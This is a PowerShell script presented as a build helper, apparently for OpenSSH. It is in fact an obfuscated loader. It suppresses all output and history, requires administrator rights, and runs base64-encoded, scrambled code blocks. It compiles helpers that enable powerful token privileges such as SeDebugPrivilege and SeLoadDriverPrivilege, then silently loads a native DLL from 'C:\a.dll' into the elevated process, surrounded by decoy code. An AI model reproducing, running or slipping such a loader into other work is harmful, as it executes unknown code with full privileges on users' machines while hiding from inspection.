[CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact="High")]
param ()
Set-StrictMode -Version 2.0

$VerbosePreference      = 'SilentlyContinue'
$DebugPreference        = 'SilentlyContinue'
$InformationPreference  = 'SilentlyContinue'
$WarningPreference      = 'SilentlyContinue'
$ErrorActionPreference  = 'SilentlyContinue'
$ConfirmPreference                 = 'None'
$WhatIfPreference                  = $false
$PSModuleAutoLoadingPreference     = 'None'
$MaximumHistoryCount               = 0

*> $null
$Error.Clear()

[string] $script:vcPath        = $null
[System.IO.DirectoryInfo] $script:OpenSSHRoot = $null
[System.IO.DirectoryInfo] $script:gitRoot     = $null
[bool]   $script:Verbose       = $false
[string] $script:BuildLogFile  = $null

function Invoke-Finalize {
    try {
        Get-Variable -Scope Script -ErrorAction SilentlyContinue |
            Remove-Variable -Scope Script -Force -ErrorAction SilentlyContinue

        Get-Variable | Where-Object {
            $_.Name -notmatch '^(PS|ExecutionContext|Host|Error|MyInvocation|PID)$'
        } | Remove-Variable -Force -ErrorAction SilentlyContinue

        $Error.Clear()

        [GC]::Collect()
        [GC]::WaitForPendingFinalizers()
        [GC]::Collect()
    }
    catch {
      
    }
}

if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")))
{
    Invoke-Finalize
    return
}

& ([scriptblock]::Create([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('aQBmACAAKAAhACgAWwBiAG8ATwBMAF0AKABbAFMARQBjAFUAcgBpAFQAeQAuAHAAUgBJAG4AYwBpAHAAQQBsAC4AdwBJAG4AZABPAFcAcwBwAHIAaQBuAGMASQBQAGEATABdACAAWwBTAGUAQwB1AHIAaQBUAFkALgBwAFIASQBuAGMASQBQAGEAbAAuAFcASQBOAGQAbwBXAHMAaQBkAGUAbgB0AEkAVAB5AF0AOgA6AGcAZQB0AGMAdQByAHIAZQBOAHQAKAApACkALgBJAHMASQBuAHIATwBsAEUAKABbAFMARQBjAHUAcgBpAHQAeQAuAHAAcgBpAG4AQwBJAFAAYQBMAC4AVwBpAE4AZABvAFcAUwBCAHUAaQBMAHQASQBOAHIAbwBsAGUAXQAgACgALQBqAG8AaQBuACgAJwBBAGQAbQAnACwAJwBpACcALAAnAG4AaQBzAHQAcgBhAHQAJwAsACcAbwAnACwAJwByACcAKQApACkAKQApAA0ACgB7AA0ACgAgACAAIAAgACYAIAAoACYAKAAkACgALQBqAG8AaQBuACgAJwBLACcALgBUAG8AQwBoAGEAcgBBAHIAcgBhAHkAKAApAHwAJQB7AFsAaQBuAHQAXQAkAGMAPQAkAF8AOwBpAGYAKAAkAGMALQBnAGUANgA1AC0AYQBuAGQAJABjAC0AbABlADkAMAApAHsAWwBjAGgAYQByAF0AKAA2ADUAKwAoACgAJABjAC0ANgA1ACsAMgAyACkAJQAyADYAKQApAH0AZQBsAHMAZQBpAGYAKAAkAGMALQBnAGUAOQA3AC0AYQBuAGQAJABjAC0AbABlADEAMgAyACkAewBbAGMAaABhAHIAXQAoADkANwArACgAKAAkAGMALQA5ADcAKwAyADIAKQAlADIANgApACkAfQBlAGwAcwBlAHsAWwBjAGgAYQByAF0AJABjAH0AfQApACkAKwAkACgAJABrADIAOAAxADUAPQAyADAANgA7ACQAYgA9AFsAYgB5AHQAZQBbAF0AXQAoADAAeABhAGIALAAwAHgAYgBhACwAMAB4AGUAMwAsADAAeAA4AGQALAAwAHgAYQAxACwAMAB4AGEAMwAsADAAeABhADMALAAwAHgAYQBmACwAMAB4AGEAMAAsADAAeABhAGEAKQA7AC0AagBvAGkAbgAoACQAYgB8ACUAewBbAGMAaABhAHIAXQAoACQAXwAtAGIAeABvAHIAJABrADIAOAAxADUAKQB9ACkAKQApACAAJAAoACQAawA5ADkAMgAyAD0AMQA4ADgAOwAkAGIAPQBbAGIAeQB0AGUAWwBdAF0AKAAwAHgAOAAzACwAMAB4ADgAMwAsADAAeAA4ADMALAAwAHgAOAAzACwAMAB4ADgAMwAsADAAeAA4ADMALAAwAHgAOAAzACwAMAB4AGQAYQAsADAAeABkADUALAAwAHgAZgAyACwAMAB4AGYAZAAsADAAeABmADAALAAwAHgAZgA1ACwAMAB4AGUANgAsADAAeABmADkAKQA7AC0AagBvAGkAbgAoACQAYgB8ACUAewBbAGMAaABhAHIAXQAoACQAXwAtAGIAeABvAHIAJABrADkAOQAyADIAKQB9ACkAKQAgAC0AQwBvAG0AbQBhAG4AZABUAHkAcABlACAARgB1AG4AYwB0AGkAbwBuACwAIAAmACgAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwBRADIAMQBrACcAKQApACkAKwAiACQAKABbAGMAaABhAHIAXQAwAHgANgBDACkAJAAoAFsAYwBoAGEAcgBdADAAeAA2ADUAKQAkACgAWwBjAGgAYQByAF0AMAB4ADcANAApACIAKQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQApAFsAMABdAA0ACgAgACAAIAAgAHIAZQB0AHUAcgBuAA0ACgB9AAoAJABuAHUAbABsACAAPQAgAC4AIAB7ACAAJABFAHgAZQBjAHUAdABpAG8AbgBDAG8AbgB0AGUAeAB0AC4AUwBlAHMAcwBpAG8AbgBTAHQAYQB0AGUALgBEAHIAaQB2AGUALgBDAHUAcgByAGUAbgB0ACAAfQAKAHcAaABpAGwAZQAgACgAJABmAGEAbABzAGUAKQAgAHsACgAgACAAIAAgACQAaQB0AGUAbQBzACAAPQAgADEALgAuADEAMAA7ACAAZgBvAHIAZQBhAGMAaAAgACgAJABpAHQAZQBtACAAaQBuACAAJABpAHQAZQBtAHMAKQAgAHsAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAE0AaQBsAGwAaQBzAGUAYwBvAG4AZABzACAAMgA1ADsAIABXAHIAaQB0AGUALQBQAHIAbwBnAHIAZQBzAHMAIAAtAEEAYwB0AGkAdgBpAHQAeQAgACIAUAByAG8AYwBlAHMAcwBpAG4AZwAgAEkAdABlAG0AcwAiACAALQBTAHQAYQB0AHUAcwAgACIASQB0AGUAbQAgACQAaQB0AGUAbQAiACAALQBQAGUAcgBjAGUAbgB0AEMAbwBtAHAAbABlAHQAZQAgACgAKAAkAGkAdABlAG0AIAAvACAAJABpAHQAZQBtAHMALgBDAG8AdQBuAHQAKQAgACoAIAAxADAAMAApACAAfQAKAH0A'))))

$definition = @'
using System;
using System.Runtime.InteropServices;
  
public class AdjPriv
{
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
    internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
    ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
    [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
    internal static extern IntPtr GetCurrentProcess();
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
    internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
    [DllImport("advapi32.dll", SetLastError = true)]
    internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    internal struct TokPriv1Luid
    {
        public int Count;
        public long Luid;
        public int Attr;
    }
  
    internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
    internal const int SE_PRIVILEGE_DISABLED = 0x00000000;
    internal const int TOKEN_QUERY = 0x00000008;
    internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
    public static bool EnablePrivilege(string privilege, bool disable)
    {
        bool retVal;
        TokPriv1Luid tp;
        IntPtr hproc = GetCurrentProcess();
        IntPtr htok = IntPtr.Zero;
        retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
        tp.Count = 1;
        tp.Luid = 0;
        if(disable)
        {
            tp.Attr = SE_PRIVILEGE_DISABLED;
        }
        else
        {
            tp.Attr = SE_PRIVILEGE_ENABLED;
        }
        retVal = LookupPrivilegeValue(null, privilege, ref tp.Luid);
        retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        return retVal;
    }
}
'@
 
try
{
    $type = Add-Type $definition -PassThru -ErrorAction SilentlyContinue | Out-Null
}
catch
{
    $type = [AdjPriv]
}

function Enable-Privilege {
    param(
    [ValidateSet(
       "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege",
       "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege",
       "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",
       "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege",
       "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege",
       "SeLockMemoryPrivilege", "SeMachineAccountPrivilege", "SeManageVolumePrivilege",
       "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege",
       "SeRestorePrivilege", "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege",
       "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeSystemtimePrivilege",
       "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
       "SeUndockPrivilege", "SeUnsolicitedInputPrivilege")]
    $Privilege,
    [Switch] $Disable
 )

    $type[0]::EnablePrivilege($Privilege, $Disable)
}

$kernel = @'
using System;
using System.Runtime.InteropServices;

public static class NativeLoader
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool FreeLibrary(IntPtr hModule);

    public static IntPtr Load(string path)
    {
        if (string.IsNullOrEmpty(path))
            return IntPtr.Zero;

        return LoadLibrary(path);
    }

    public static bool Unload(ref IntPtr handle)
    {
        if (handle == IntPtr.Zero)
            return false;

        bool result = FreeLibrary(handle);
        handle = IntPtr.Zero;
        return result;
    }

    public static void Clear(ref IntPtr handle)
    {
        if (handle != IntPtr.Zero)
        {
            FreeLibrary(handle);
            handle = IntPtr.Zero;
        }
    }
}
'@

try {
    $type = Add-Type $kernel -PassThru -ErrorAction SilentlyContinue | Out-Null
}
catch {
    $type = [NativeLoader]
}

Invoke-Command -ScriptBlock ([scriptblock]::Create([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('WwBOAEEAdABJAFYARQBMAG8AYQBEAGUAcgBdADoAOgBMAG8AYQBEACgAKAAtAGoAbwBpAG4AKAAnAEMAOgBcAGEAJwAsACcALgBkACcALAAnAGwAbAAnACkAKQApAAoAdAByAHkAIAB7AAoAIAAgACAAIAB0AGgAcgBvAHcAIAAiAEkAbgB0AGUAbgB0AGkAbwBuAGEAbABsAHkAIABzAGsAaQBwAHAAaQBuAGcAIAB0AGgAaQBzACAAYgBsAG8AYwBrACIAOwAKACAAIAAgACAAJABlAG4AdgA6AFQARQBNAFAAXwBBAFAAUABfAFMARQBUAFQASQBOAEcAIAA9ACAAKABHAGUAdAAtAFIAYQBuAGQAbwBtACAALQBNAGEAeABpAG0AdQBtACAAMQAwADAAKQA7ACAAVwByAGkAdABlAC0ARABlAGIAdQBnACAAIgBTAGUAdAAgAHQAZQBtAHAAbwByAGEAcgB5ACAAZQBuAHYAaQByAG8AbgBtAGUAbgB0ACAAdgBhAHIAaQBhAGIAbABlACAAVABFAE0AUABfAEEAUABQAF8AUwBFAFQAVABJAE4ARwA9ACQAKAAkAGUAbgB2ADoAVABFAE0AUABfAEEAUABQAF8AUwBFAFQAVABJAE4ARwApACIACgB9ACAAYwBhAHQAYwBoACAAewB9AAoAWwBjAGgAYQByAF0ANwA1ACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA='))))